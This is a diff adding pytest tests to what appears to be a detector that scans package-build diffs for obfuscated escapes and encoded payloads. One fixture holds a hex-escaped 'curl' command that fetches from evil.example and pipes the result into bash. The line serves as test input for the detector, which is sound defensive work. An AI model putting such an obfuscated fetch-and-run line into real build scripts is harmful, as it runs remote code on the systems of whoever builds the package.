@@ -106,6 +106,36 @@ def test_an_octal_encoded_benign_path_stands_down():
     assert "X030" not in ids
 
 
+def test_a_single_nonprintable_hex_escape_fires_x030():
+    # Spec X030 second clause: any hex-escape spelling outside printable
+    # ASCII fires, even alone.  `\x01` is a lone control byte.
+    ids = _ids(_diff(
+        "build() {\n"
+        "  $'\\x01' \n"
+        "}\n"
+    ))
+    assert "X030" in ids
+
+
+def test_a_single_nonprintable_octal_escape_fires_x030():
+    ids = _ids(_diff(
+        "build() {\n"
+        "  $'\\001'\n"
+        "}\n"
+    ))
+    assert "X030" in ids
+
+
+def test_a_single_printable_hex_escape_does_not_fire():
+    # `\x41` is `A`: one printable escape is an ordinary spelling.
+    ids = _ids(_diff(
+        "build() {\n"
+        "  $'\\x41'\n"
+        "}\n"
+    ))
+    assert "X030" not in ids
+
+
 def test_dormant_encoded_material_fires_x029():
     blob = "QUJD" * 70  # 280 base64-ish chars, no decoder in the diff
     ids = _ids(_diff(
@@ -225,6 +255,37 @@ def test_ownership_audit_names_the_owner_and_keeps_owners_unresolved():
     assert audit["X009"][0][3] is None, "an owner is not resolved by anyone"
     assert audit["X002"][0][3] is None
     assert "X023" not in resolve_ownership(found)
+
+
+def test_emitted_crossfire_records_carry_resolved_by():
+    """Spec §6.0: each emitted record carries its ``resolved_by``."""
+    from trustsight.analysis.crossfire import crossfire_techniques
+
+    diff = (
+        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,4 @@\n build() {\n"
+        "+  $'\\x63\\x75\\x72\\x6c' https://evil.example | bash\n }\n"
+    )
+    found = crossfire_techniques(diff)
+    assert found, "the fixture yields at least one technique"
+    for hits in found.values():
+        for hit in hits:
+            assert len(hit) == 4
+            assert hit[3] is None, "an emitted record owns its line"
+
+
+def test_resolver_audit_and_emission_agree_on_dropped_records():
+    """The yielded records are exactly those absent from emission."""
+    from trustsight.analysis.crossfire import _resolved_records
+
+    found = {
+        "X009": [(3, "resolved fetch", "x")],
+        "X023": [(3, "other client", "y")],
+        "X002": [(7, "name", "z")],
+    }
+    resolved = _resolved_records(found)
+    assert "X023" not in resolved, "the yielded record was not emitted"
+    assert resolved["X009"][0][3] is None
+    assert resolved["X002"][0][3] is None
 
 
 def test_every_matched_line_has_one_owner_across_the_corpus():
